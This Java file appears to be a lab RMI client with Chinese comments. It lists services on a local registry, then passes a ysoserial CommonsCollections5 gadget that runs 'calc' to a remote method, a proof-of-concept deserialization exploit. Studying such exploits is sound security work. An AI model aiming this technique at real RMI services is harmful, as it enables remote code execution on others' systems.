package RMI;

import ysoserial.payloads.CommonsCollections5;

import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import static RMI.RMIServer.RMI_NAME;

public class RMIClient {
    public static void  main(String[] args){
        try{
            //获取服务注册器
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",1099);
            //获取所有注册的服务
            String[] list = registry.list();
            for (String i:list){
                System.out.println("已注册的服务:"+i);
            }

            //寻找RMI_Name对应的RMI实例
            Hello rt = (Hello) Naming.lookup(RMI_NAME);

            //调用Server的Hello()方法，并获取返回值
            String result1 = rt.hello();
            String result2 = rt.hello("Al1ex");
            String result3 = rt.hello(new CommonsCollections5().getObject("calc"));

            System.out.println(result1);
            System.out.println(result2);
            System.out.println(result3);

        }catch (Exception e){
            e.printStackTrace();
        }
    }
}

